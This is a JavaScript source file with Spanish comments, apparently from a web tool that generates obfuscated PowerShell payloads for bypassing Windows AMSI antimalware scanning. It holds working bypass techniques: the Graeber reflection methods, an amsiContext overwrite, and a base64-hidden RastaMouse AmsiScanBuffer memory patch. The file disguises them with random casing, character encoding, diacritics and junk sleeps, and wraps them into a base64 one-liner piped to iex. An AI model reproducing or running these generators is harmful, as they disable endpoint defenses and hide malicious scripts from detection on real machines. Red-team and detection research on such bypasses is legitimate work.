/**
 * ¿Puedo actualizar esto?
 * Toma una cadena de texto, la convierte de Unicode a una cadena en base64
 * Referencia: https://stackoverflow.com/a/30106551
 * @param {String} Cadena en UTF-8
 * @returns {string} Versión en base64 de la cadena en Unicode
 */
function toBinary(string) {
    const codeUnits = new Uint16Array(string.length);
    for (let i = 0; i < codeUnits.length; i++) {
      codeUnits[i] = string.charCodeAt(i);
    }
    return btoa(String.fromCharCode(...new Uint8Array(codeUnits.buffer)));
  }
  
  /**
   * Retorna un número entero aleatorio entre 0 y el máximo (exclusivo)
   * @param {Integer} valor máximo (exclusivo)
   * @returns {Integer} número entero aleatorio
   */
  function randomInt(max) {
    return Math.floor(Math.random() * max);
  }
  
  /**
   * Aleatoriza las mayúsculas y minúsculas de la entrada
   * @param {String} entrada
   * @returns {String} salida con mayúsculas y minúsculas aleatorias
   */
  function randomCase(input){
      // randomize casing
      return input.split('').map((c) => Math.round(Math.random()) ? c.toUpperCase() : c.toLowerCase()).join('')
  }
  
  /**
   * Retorna el valor ASCII de un carácter (Ejemplo: A => 41)
   * @param {String} carácter
   * @returns {Integer} valor ASCII del carácter de entrada
   */
  function charEncode(char){
      let asciiValue = char.charCodeAt(0)
  
      return obfuscateInt(asciiValue)
  }
  
  /**
   * Codifica un carácter como un "byte" ofuscado (Ejemplo: A => ([byte]0x41))
   * @param {String} carácter
   * @returns {Integer} valor ofuscado como "byte"
   */
  function byteEncode(char){
      const asciiValue = char.charCodeAt(0)
  
      return `([${randomCase("byte")}]0x${asciiValue.toString(16)})`
  }
  
  /**
   * Ofusca un número entero de 4 formas diferentes (Ejemplo: 41 => (21+20))
   * @param {Integer} número entero
   * @returns {Integer} número entero ofuscado
   */
  function obfuscateInt(int){
      const subNumber = randomInt(int-2) + 1 // Avoid divide by zero
  
      switch (randomInt(4)) {
          case 0:
              return `(${subNumber}+${int - subNumber})`
          case 1:
              return `(${int}+${subNumber}-${subNumber})`
          case 2:
              return `(${int}*${subNumber}/${subNumber})`
          case 3:
              return `(${int})`
      }
      return int
  }
  
  
  /*
   * De: https://stackoverflow.com/questions/7033639/split-large-string-in-n-size-chunks-in-javascript
   * Divide una cadena en fragmentos de tamaño N
   * @param {String} str, {Int} size 
   * @returns {Array} Fragmentos de la cadena dividida en N (tamaño)
   */
  function chunkSubstr(str, size) {
    const numChunks = Math.ceil(str.length / size)
    const chunks = new Array(numChunks)
  
    for (let i = 0, o = 0; i < numChunks; ++i, o += size) {
      chunks[i] = str.substr(o, size)
    }
  
    return chunks
  }
  
  
  
  /**
   * Ofusca un carácter de 2 maneras diferentes (Ejemplo: "A" => "+[CHAR]41")
   * @param {String} carácter
   * @returns {String} carácter ofuscado
   */
  function obfuscateChar(char){
      const startChar = "+"
      switch (randomInt(2)) {
          case 0:
              return startChar + "[" + randomCase("CHAR") + "]" + byteEncode(char)
      
          case 1:
              return startChar + "[" + randomCase("CHAR") + "]" + charEncode(char)
      }
  }
  
  /**
   * Mapea cada carácter de entrada a su equivalente diacrítico
   * @param {String} cadena
   * @returns {String} cadena ofuscada
   */
  function diacriticEncode(input){
      let encodedString= [...input].map(c => getRandomDiacritic(c.charCodeAt(0))).join('')
      let stringSize= randomInt(encodedString.length-2)
      let encodedArray= chunkSubstr(encodedString,stringSize+1)
      return encodedArray.join('\'+\'')
  }
  
  /**
   * Toma un valor ASCII y trata de encontrar un carácter diacrítico para él. Si no, devuelve el mismo carácter.
   * @param {Integer} valor ASCII del carácter
   * @returns {String} un carácter diacrítico o el mismo carácter si no se encuentra un equivalente
   */
  function getRandomDiacritic(asciiValue){
      let min = 0
      let max = 0
      switch (asciiValue){
          case 65:   //A
              min = 192
              max = 197
              return String.fromCharCode(min + randomInt(max - min))
          case 97:  //a
              min = 224
              max = 229
              return String.fromCharCode(min + randomInt(max - min))
          case 73:  //I
              min = 204
              max = 207
              return String.fromCharCode(min + randomInt(max - min))
          case 105:  //i
              min = 236
              max = 239
              return String.fromCharCode(min + randomInt(max - min))
          case 79:  //O
              min = 210
              max = 216
              return String.fromCharCode(min + randomInt(max - min))
          case 69: //E
              min = 200
              max = 203
              return String.fromCharCode(min + randomInt(max - min))
          case 101: //e
              min = 232
              max = 235
              return String.fromCharCode(min + randomInt(max - min))
          case 85:  //U
              min = 217
              max = 220
              return String.fromCharCode(min + randomInt(max - min))
          case 117: //u
              min = 249
              max = 252
              return String.fromCharCode(min + randomInt(max - min))
          case 111: //o
              min = 243
              max = 246
              return String.fromCharCode(min + randomInt(max - min))
          default:
              return String.fromCharCode(asciiValue)
      }
  }
  
  /**
   * Toma una cadena de entrada y la ofusca usando caracteres ofuscados o diacríticos
   * @param {String} entrada
   * @returns {String} cadena ofuscada
   */
   function obfuscateString(input){
      switch (randomInt(2)) {
          case 0:
              return [...input].map(c => obfuscateChar(c)).join('')
          case 1:
              // FormD obfuscate, we use substring(1) to remove the first +
              let obfuscatedFormD = [..."FormD"].map(c => obfuscateChar(c)).join('').substring(1)
              // pattern obfuscate, we use substring(1) to remove the first +    
              let obfuscatedPattern = [...String.raw`\p{Mn}`].map(c => obfuscateChar(c)).join('').substring(1)
  
              return `+('${diacriticEncode(input)}').${randomCase("Normalize")}(${obfuscatedFormD}) -replace ${obfuscatedPattern}`
      }
  }
  
  /**
   * Ofusca todas las cadenas dentro de comillas simples.
   * Contiene una lista de valores "mustEncode" que siempre serán codificados.
   * @param {String} entrada
   * @returns {String} versión ofuscada de la entrada
   */
   function encodePayload(input) {
      // Find all strings inside single quotes
      const re = /\'(.*?)\'/g;
  
      // Obfuscate all strings inside single quotes, except for specific cases
      input = input.replace(re, (match, p1) => {
          if (p1.startsWith("System.") || p1.includes(".System.")) {
              return match; // Keep the original string
          }
          let obf = obfuscateString(p1).substring(1);
          return `$(${obf})`;
      });
  
      const mustEncode = [
          "amsiContext",
          "amsiSession",
          "AmsiUtils",
          "amsiInitFailed",
          "WriteInt32",
          "Management",
          "Automation",
      ];
  
      // Special handling for "System"
      input = input.replace(/\bSystem\b(?!\.(?:Text\.Encoding|Convert|Reflection|Runtime|Management))/g, (match) => {
          let obf = obfuscateString(match).substring(1);
          return `$(${obf})`;
      });
  
      for (const word of mustEncode) {
          let obf = obfuscateString(word).substring(1);
          if (word === "amsiInitFailed") {
              obf = `'+$(${obf})+'`;
          } else {
              obf = `$(${obf})`;
          }
          input = input.replace(new RegExp(`\\b${word}\\b`, 'g'), obf);
      }
  
      
      // Add random junk and sleep
      const junk1 = getRandomJunk();
      const junk2 = getRandomJunk();
      input = input.replace(/;(?!$)/, `;$${junk1}="${obfuscateString(junk2)}";[Threading.Thread]::Sleep(${randomInt(2000)});`);
  
      // Replace $null with a random variable
      const nullValue = randomCase(randomString(randomInt(10)));
      input = input.replace(/\$null\b/g, `$${nullValue}`);
  
      // Add final junk and sleep
      const junk3 = getRandomJunk();
      const junk4 = getRandomJunk();
      input += `;$${junk3}="${obfuscateString(junk4)}";[Threading.Thread]::Sleep(${randomInt(2000)})`;
  
      // Remove double semicolons
      input = input.replace(/;;/g, ';');
  
      // Add null assignment after newlines
      input = input.replace(/\n/g, `\n$${nullValue}=$null;`);
  
     // input = input.replace(/\$null\b/g, () => getRandomNullAlternative());
  
      return input;
  }
  
  /**
   * Alternativa aleatoria para representar un valor nulo.
   * @returns {String} alternativa al valor null
   */
  function getRandomNullAlternative() {
      const alternatives = [
          "[System.DBNull]::Value",
          "[NullString]::Value",
          "[System.Management.Automation.Internal.AutomationNull]::Value",
          "[Void]",
          "$()",
          "@()",
          "''",
          "[String]::Empty",
          "$PSItem"
      ];
      return alternatives[Math.floor(Math.random() * alternatives.length)];
  }
  
  /**
   * Genera una cadena aleatoria para insertar como ruido en el código.
   * @param {Integer} longitud
   * @returns {String} cadena aleatoria con la longitud dada
   */
   function getRandomJunk(){
      let length = randomInt(30) 
      const alphabet = "abcdefghijklmnopqrstuvwxyz"
      let ret = ""
      for(var i=0; i < length; i++){
          ret += alphabet[Math.floor(Math.random() * alphabet.length)]
      }
      return ret
  }
  
  
  /**
   * Crea una cadena aleatoria adecuada para nombres de variables en PowerShell.
   * @param {Integer} longitud
   * @returns {String} cadena aleatoria con la longitud especificada
   */
   function randomString() {
      const minLength = 3;
      const maxLength = 20;
      const length = Math.floor(Math.random() * (maxLength - minLength + 1)) + minLength;
  
      const chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ_0123456789";
  
      let ret = chars[Math.floor(Math.random() * 53)]; // First 53 characters (excluding numbers)
      
      for (let i = 1; i < length; i++) {
          ret += chars[Math.floor(Math.random() * chars.length)];
      }
      return ret;
  }
  
  /**
   * Función especial para codificar el bypass de AMSI de RastaMouse.
   * @param {String} bypass AMSI de RastaMouse
   * @returns {String} versión ofuscada de la entrada
   */
  function encodeRasta(input){
      const mustEncode = [
          "AmsiScanBuffer",
          "amsi.dll"
      ]
  
      const varsToEncode = [
          "Win32",
          "LibLoad",
          "lpAddress",
          "flNewProtect",
          "lpflOldProtect",
          "hModule",
          "procName",
          "MemAdr",
          "Patch",
          "var1",
          "var2",
          "var3",
          "var4",
          "var5",
          "var6",
          "dwSize"
      ]
  
      for (let word of varsToEncode){
          let newword = randomString(word.length)
          input = input.replaceAll(word, newword)
      }
  
      for (let word of mustEncode){
          let obf = obfuscateString(word)
          obf = `$(${obf.substring(1)})`
          input = input.replaceAll(word, obf)
      }
  
      return input
  }
  
  /**
   * Selecciona aleatoriamente una carga útil y la codifica.
   * @returns {String} bypass AMSI ofuscado aleatorio
   */
   function getPayload(){
      let memvar = randomString(3 + randomInt(7));
      const ForceErrer = `#Unknown - Force error \n$${memvar}=[System.Runtime.InteropServices.Marshal]::AllocHGlobal(${obfuscateInt(9076)});[Ref].Assembly.GetType(\"System.Management.Automation.AmsiUtils\").GetField(\"amsiSession\", \"NonPublic,Static\").SetValue($null, $null);[Ref].Assembly.GetType(\"System.Management.Automation.AmsiUtils\").GetField(\"amsiContext\", \"NonPublic,Static\").SetValue($null, [IntPtr]$${memvar});`
      const MattGRefl = `#Matt Graebers Reflection method \n$${memvar}=\"System.Management.Automation.AmsiUtils\";[Ref].Assembly.GetType($${memvar}).GetField('amsiInitFailed',\"NonPublic,Static\").SetValue($null,$true);`;
      const MattGReflLog = `#Matt Graebers Reflection method with WMF5 autologging bypass \n$${memvar}=\"System.Management.Automation.AmsiUtils\";[Delegate]::CreateDelegate((\"Func\`\`3[String, $(([String].Assembly.GetType('System.Reflection.BindingFlags')).FullName), System.Reflection.FieldInfo]\" -as [String].Assembly.GetType('System.Type')), [Object]([Ref].Assembly.GetType($${memvar})),('GetField')).Invoke('amsiInitFailed',((\"NonPublic,Static\") -as [String].Assembly.GetType('System.Reflection.BindingFlags'))).SetValue($null,$True);`;
      const MattGref02 = `#Matt Graebers second Reflection method \n$${memvar}=\"System.Management.Automation.AmsiUtils\";[Runtime.InteropServices.Marshal]::(\"WriteInt32\")([Ref].Assembly.GetType($${memvar}).GetField(\"amsiContext\",[Reflection.BindingFlags]\"NonPublic,Static\").GetValue($null),0x${randomInt(2147483647).toString(16)});`
      const RastaBuf = atob("I1Jhc3RhLW1vdXNlcyBBbXNpLVNjYW4tQnVmZmVyIHBhdGNoIFxuDQokV2luMzIgPSBAIg0KdXNpbmcgU3lzdGVtOw0KdXNpbmcgU3lzdGVtLlJ1bnRpbWUuSW50ZXJvcFNlcnZpY2VzOw0KcHVibGljIGNsYXNzIFdpbjMyIHsNCiAgICBbRGxsSW1wb3J0KCJrZXJuZWwzMiIpXQ0KICAgIHB1YmxpYyBzdGF0aWMgZXh0ZXJuIEludFB0ciBHZXRQcm9jQWRkcmVzcyhJbnRQdHIgaE1vZHVsZSwgc3RyaW5nIHByb2NOYW1lKTsNCiAgICBbRGxsSW1wb3J0KCJrZXJuZWwzMiIpXQ0KICAgIHB1YmxpYyBzdGF0aWMgZXh0ZXJuIEludFB0ciBMb2FkTGlicmFyeShzdHJpbmcgbmFtZSk7DQogICAgW0RsbEltcG9ydCgia2VybmVsMzIiKV0NCiAgICBwdWJsaWMgc3RhdGljIGV4dGVybiBib29sIFZpcnR1YWxQcm90ZWN0KEludFB0ciBscEFkZHJlc3MsIFVJbnRQdHIgZHdTaXplLCB1aW50IGZsTmV3UHJvdGVjdCwgb3V0IHVpbnQgbHBmbE9sZFByb3RlY3QpOw0KfQ0KIkANCg0KQWRkLVR5cGUgJFdpbjMyDQoNCiRMaWJMb2FkID0gW1dpbjMyXTo6TG9hZExpYnJhcnkoImFtc2kuZGxsIikNCiRNZW1BZHIgPSBbV2luMzJdOjpHZXRQcm9jQWRkcmVzcygkTGliTG9hZCwgIkFtc2lTY2FuQnVmZmVyIikNCiRwID0gMA0KW1dpbjMyXTo6VmlydHVhbFByb3RlY3QoJE1lbUFkciwgW3VpbnQzMl01LCAweDQwLCBbcmVmXSRwKQ0KJHZhcjEgPSAiMHhCOCINCiR2YXIyID0gIjB4NTciDQokdmFyMyA9ICIweDAwIg0KJHZhcjQgPSAiMHgwNyINCiR2YXI1ID0gIjB4ODAiDQokdmFyNiA9ICIweEMzIg0KJFBhdGNoID0gW0J5dGVbXV0gKCR2YXIxLCR2YXIyLCR2YXIzLCR2YXI0LCskdmFyNSwrJHZhcjYpDQpbU3lzdGVtLlJ1bnRpbWUuSW50ZXJvcFNlcnZpY2VzLk1hcnNoYWxdOjpDb3B5KCRQYXRjaCwgMCwgJE1lbUFkciwgNik=");
  
      switch (randomInt(5)) {
          case 0:
              return encodePayload(ForceErrer)
          case 1:
              return encodePayload(MattGRefl)
          case 2:
              return encodePayload(MattGReflLog)
          case 3:
              return encodePayload(MattGref02)
          case 4:
              return encodeRasta(RastaBuf)
      }
  }
  
  
  function GeneratePS(){
     
     document.getElementById("PowerShellOut").value =  getPayload();            
  }
  
  function GenerateEncPS(){
     document.getElementById("PowerShellOut").value =  `${randomCase("[System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String(")}"${toBinary(getPayload())}"))|iex`           
  }